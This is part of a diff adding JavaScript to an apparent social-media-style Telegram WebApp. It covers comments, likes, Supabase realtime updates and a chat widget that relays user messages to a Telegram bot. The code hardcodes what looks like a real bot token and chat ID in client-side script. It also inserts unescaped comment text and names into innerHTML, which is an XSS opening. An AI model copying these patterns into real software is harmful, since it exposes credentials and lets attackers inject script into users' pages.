+function refreshCommentsDisplay(postId){if(currentPostId!==postId)return;var comments=commentsStore[postId]||[];var list=document.getElementById('commentsList');if(!list)return;var html='';for(var i=0;i<Math.min(comments.length,100);i++){var c=comments[i];html+='<div class="comment-item"><img class="comment-avatar-img" src="'+c.avatar+'" onerror="this.src=\'https://ui-avatars.com/api/?name='+encodeURIComponent(c.name)+'&background=random&size=100&bold=true&color=fff\'"><div class="comment-content"><div class="comment-header"><span class="comment-name">'+c.name+'</span>'+(c.verified?'<i class="fa-solid fa-circle-check" style="color:#1d9bf0;font-size:12px;"></i>':'')+'<span class="comment-username">'+c.username+'</span><span class="comment-time">· '+c.time+'</span></div><div class="comment-text">'+c.text+'</div><div class="comment-actions"><span onclick="likeComment(\''+c.id+'\',this)"><i class="fa-'+(userLikedComments[c.id]?'solid':'regular')+' fa-heart" style="color:'+(userLikedComments[c.id]?'#f91880':'#71767b')+'"></i> <span>'+(userLikedComments[c.id]?c.likes+1:c.likes)+'</span></span><span><i class="fa-regular fa-comment"></i> '+c.replies+'</span><span><i class="fa-solid fa-share-nodes"></i></span></div></div></div>';}list.innerHTML=html;}
+function likeComment(commentId,element){if(userLikedComments[commentId])delete userLikedComments[commentId];else userLikedComments[commentId]=true;localStorage.setItem('likedComments',JSON.stringify(userLikedComments));if(currentPostId)refreshCommentsDisplay(currentPostId);}
+function toggleLikeFromComments(postId,element){var isLiked=userLikedPosts[postId]||false;var heartIcon=element.querySelector('i');var span=element.querySelector('span');var text=span.textContent;var num=parseMetricToNumber(text);if(isLiked){delete userLikedPosts[postId];element.classList.remove('liked');heartIcon.className='fa-regular fa-heart';num=Math.max(0,num-1);}else{userLikedPosts[postId]=true;element.classList.add('liked');heartIcon.className='fa-solid fa-heart';num+=1;}span.textContent=formatDisplayCount(num);localStorage.setItem('likedPosts',JSON.stringify(userLikedPosts));}
+function updateReplyButton(){var input=document.getElementById('commentInput');var btn=document.getElementById('replyBtn');btn.classList.toggle('active',input.value.trim().length>0);}
+function submitComment(){var input=document.getElementById('commentInput');var text=input.value.trim();if(!text||!currentPostId)return;var uc={id:currentPostId+'-comment-'+Date.now()+'-user',postId:currentPostId,name:"You",username:"@user",avatar:"https://images.unsplash.com/photo-1500648767791-00dcc994a43e?q=80&w=100&auto=format&fit=crop",verified:false,text:text,time:"now",likes:0,replies:0,timestamp:Date.now()};if(!commentsStore[currentPostId])commentsStore[currentPostId]=[];commentsStore[currentPostId].unshift(uc);input.value='';updateReplyButton();refreshCommentsDisplay(currentPostId);}
+
+// =============================================
+// CHAT
+// =============================================
+var botToken="8585408795:AAG_B28wAl0JhU6TgIU1G0Pc9ijDP53iJkM";var chatId="6610497090";var lastUpdateId=0;
+var sessionUserId=localStorage.getItem('chatSessionUserId')||(function(){var id='User-'+Math.floor(100000+Math.random()*900000);localStorage.setItem('chatSessionUserId',id);return id;})();
+var chatContainer=document.getElementById('chatContainer');var messageInput=document.getElementById('messageInputField');
+function toggleChatWindow(){var box=document.getElementById('facebookChatPopup');if(box.style.display==='flex'){box.style.display='none';}else{box.style.display='flex';setTimeout(function(){messageInput.focus();chatContainer.scrollTop=chatContainer.scrollHeight;},100);}}
+function appendMessageNode(text,type){var msg=document.createElement('div');msg.className='message '+type;msg.textContent=text;chatContainer.appendChild(msg);chatContainer.scrollTop=chatContainer.scrollHeight;localStorage.setItem('chatHistoryLogs',chatContainer.innerHTML);}
+function sendChatMessage(){var text=messageInput.value.trim();if(!text)return;appendMessageNode(text,'sent');messageInput.value="";fetch('https://api.telegram.org/bot'+botToken+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:chatId,text:'[#'+sessionUserId+'] '+text})}).catch(function(e){console.warn(e);});}
+if(window.visualViewport){window.visualViewport.addEventListener('resize',function(){var box=document.getElementById('facebookChatPopup');if(box&&box.style.display==='flex')chatContainer.scrollTop=chatContainer.scrollHeight;});}
+function pollTelegram(){fetch('https://api.telegram.org/bot'+botToken+'/getUpdates?offset='+(lastUpdateId+1)+'&timeout=5').then(function(r){return r.json();}).then(function(data){if(data.ok&&data.result&&data.result.length>0){data.result.forEach(function(u){lastUpdateId=u.update_id;var msg=u.message;if(msg&&String(msg.chat.id)===chatId&&msg.reply_to_message&&msg.reply_to_message.text){var m=msg.reply_to_message.text.match(/\[#(User-\d+)\]/);if(m&&m[1]===sessionUserId&&msg.text)appendMessageNode(msg.text,'received');}});}setTimeout(pollTelegram,400);}).catch(function(){setTimeout(pollTelegram,3000);});}
+
+// =============================================
+// REALTIME SUBSCRIPTION
+// =============================================
+function subscribeToChanges() {
+    _supabase
+        .channel('schema-db-changes')
+        .on(
+            'postgres_changes',
+            { event: '*', schema: 'public', table: 'posts' },
+            (payload) => {
+                console.log('Change detected!', payload);
+                fetchAndRender();
+            }
+        )
+        .subscribe();
+}
+
+// =============================================
+// INIT (WITH TELEGRAM NATIVE WEBAPP EXPANSION)
+// =============================================
+window.addEventListener('DOMContentLoaded', function() {
+    // Native Telegram WebApp SDK Initialization
+    var tg = window.Telegram && window.Telegram.WebApp;
+    if (tg) {
+        try {
+            tg.expand();
+            tg.setHeaderColor('#000000');
+            tg.setBackgroundColor('#000000');
+            tg.enableClosingConfirmation();
+            
+            var uid = tg.initDataUnsafe && tg.initDataUnsafe.user && tg.initDataUnsafe.user.id;
+            if (uid) {
+                sessionUserId = 'TG-' + uid;
+            }
+        } catch(e) {
+            console.warn('Telegram WebApp init error:', e);
+        }
+    }
+
+    fetchAndRender();
+    subscribeToChanges();
+    var saved = localStorage.getItem('chatHistoryLogs');
+    if(saved){chatContainer.innerHTML=saved;chatContainer.scrollTop=chatContainer.scrollHeight;}
+    pollTelegram();
+});
+</script>
+</body>
+</html>
